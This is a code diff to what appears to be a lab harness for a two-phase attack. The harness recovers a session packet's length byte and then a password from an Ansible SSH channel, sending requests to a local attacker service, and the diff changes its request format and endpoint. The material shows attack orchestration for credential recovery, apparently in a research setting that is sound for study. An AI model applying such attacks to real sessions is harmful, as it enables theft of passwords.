@@ -30,7 +30,7 @@ ATTACKER_BASE = "http://127.0.0.1:9000"
 CLIENT_BASE = "http://127.0.0.1:8000"
 
 # 8-byte CHANNEL_DATA header prefix for a session-channel packet.  See
-# attacker/attack_ansible.py for the full derivation.
+# attacker/attack/adapters/ansible.py for the full derivation.
 PHASE1_PREFIX = "\x5e\x00\x00\x00\x00\x00\x00\x00"
 # Plausible password length bytes (accounts for up to a 31-char password
 # + trailing \n).  All below 0x80 so UTF-8 encoding is a no-op.
@@ -147,16 +147,22 @@ def main() -> int:
     # Phase 1 -- recover the CHANNEL_DATA data-length byte ------------
     print("  Phase 1: recovering CHANNEL_DATA length byte...")
     phase1_body = json.dumps({
-        "known_prefix": PHASE1_PREFIX,
-        "alphabet": PHASE1_ALPHABET,
-        "max_length": 1,
-        "terminator": "\x00",
-        "min_margin": 8,
-        "max_rounds": 96,
-        "noise_hints": [ 1 ],
+        "variant": "ansible",
+        "config": {
+            "known_prefix": PHASE1_PREFIX,
+            "alphabet": PHASE1_ALPHABET,
+            "max_length": 1,
+            "terminator": "\x00",
+            "min_margin": 8,
+            "max_rounds": 96,
+            # noise_hints is replaced by fixed_single alignment at the
+            # known-winning alignment length (empirically nl=1).
+            "alignment_mode": "fixed_single",
+            "alignment_lengths": [1],
+        },
     }).encode("utf-8")
     t1 = time.time()
-    r1 = http("POST", f"{ATTACKER_BASE}/run_attack_ansible",
+    r1 = http("POST", f"{ATTACKER_BASE}/run_attack",
               body=phase1_body, content_type="application/json")
     if not r1.get("ok"):
         fail(f"Phase 1 attack failed: {r1}")
@@ -177,15 +183,19 @@ def main() -> int:
     print("  Phase 2: recovering password...")
     phase2_prefix = PHASE1_PREFIX + length_str  # 9 bytes total
     phase2_body = json.dumps({
-        "known_prefix": phase2_prefix,
-        "alphabet": PHASE2_ALPHABET,
-        "max_length": length_byte,
-        "terminator": "\n",
-        "min_margin": 8,
-        "max_rounds": 96,
-        "noise_hints": [ 1 ] * length_byte
+        "variant": "ansible",
+        "config": {
+            "known_prefix": phase2_prefix,
+            "alphabet": PHASE2_ALPHABET,
+            "max_length": length_byte,
+            "terminator": "\n",
+            "min_margin": 8,
+            "max_rounds": 96,
+            "alignment_mode": "fixed_single",
+            "alignment_lengths": [1],
+        },
     }).encode("utf-8")
-    r2 = http("POST", f"{ATTACKER_BASE}/run_attack_ansible",
+    r2 = http("POST", f"{ATTACKER_BASE}/run_attack",
               body=phase2_body, content_type="application/json")
     if not r2.get("ok"):
         fail(f"Phase 2 attack failed: {r2}")
